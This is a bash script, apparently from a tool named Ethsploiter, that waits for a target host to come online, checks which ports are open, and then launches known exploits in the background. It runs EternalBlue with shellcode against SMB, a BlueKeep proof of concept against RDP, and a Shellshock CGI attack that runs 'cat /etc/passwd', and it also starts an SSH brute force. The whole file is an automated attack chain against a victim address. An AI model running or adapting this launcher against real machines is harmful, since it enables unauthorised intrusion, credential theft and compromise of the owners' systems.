#!/bin/bash

VICTIM_ADDRESS=192.168.20.122
ETHSPLOITER_PATH=/home/pi/Ethsploiter
LOG_DIR=$ETHSPLOITER_PATH/runtime/logs

mkdir -p $LOG_DIR
LOG_FILE=()

printf "%s" "waiting for Victim host to be up ..."
while ! ping -c 1 -n -w 1 $VICTIM_ADDRESS &> /dev/null
do
    printf "%c" "."
done
printf "\n%s\n"  "Server is back online"

returnVal=()
convertArgsStrToArray() {
    local concat=""
    local t=""
    returnVal=()

    for word in $@; do
        local len=`expr "$word" : '.*"'`

        [ "$len" -eq 1 ] && concat="true"

        if [ "$concat" ]; then
            t+=" $word"
        else
            word=${word#\"}
            word=${word%\"}
            returnVal+=("$word")
        fi

        if [ "$concat" -a "$len" -gt 1 ]; then
            t=${t# }
            t=${t#\"}
            t=${t%\"}
            returnVal+=("$t")
            t=""
            concat=""
        fi
    done
}

function testInfo {
	echo
	echo 
	echo "----------------------------------- testing $1 ----------------------------------------"
	LOG_FILE=$1
}

function checkPort {
	ARGS="${*:3}"
	convertArgsStrToArray $ARGS
	COMMAND=$2
	nc -zv $VICTIM_ADDRESS $1
	if [ $? -eq 0 ]; then
		echo executing $COMMAND $ARGS
		echo "logfile: $LOG_DIR/$LOG_FILE.log"
		$COMMAND "${returnVal[@]}" > $LOG_DIR/$LOG_FILE.log 2>&1 &
	fi
	echo 
}

# Windows
testInfo "eternalblue"
checkPort 445 python $ETHSPLOITER_PATH/exploits/windows/eternalblue/eternalblue_exploit7.py $VICTIM_ADDRESS $ETHSPLOITER_PATH/exploits/windows/eternalblue/shellcode/exec_sc_all.bin

testInfo "bluekeep"
checkPort 3389 python3 $ETHSPLOITER_PATH/exploits/windows/bluekeep/win7_32_poc.py $VICTIM_ADDRESS

#nc -zv 192.168.20.122 80
#if [ checkPort 80 -eq 0 ]; then
#	/home/pi/Ethsploiter/exploits/multi/shellshock/shellshock_mod_cgi_bash_exec.sh 192.168.20.122 /cgi-bin/hw.cgi "cat /etc/passwd" > /home/pi/passwords_surprise &
#ff

# Linux
testInfo "shellshock_Apache_CGI"
checkPort 80 $ETHSPLOITER_PATH/exploits/multi/shellshock/shellshock_mod_cgi_bash_exec.sh $VICTIM_ADDRESS /cgi-bin/hw.cgi \"cat /etc/passwd\"

#multi
testInfo "ssh_brute_force"
checkPort 22 $ETHSPLOITER_PATH/exploits/multi/ssh/login/ssh_brute.sh $VICTIM_ADDRESS $ETHSPLOITER_PATH
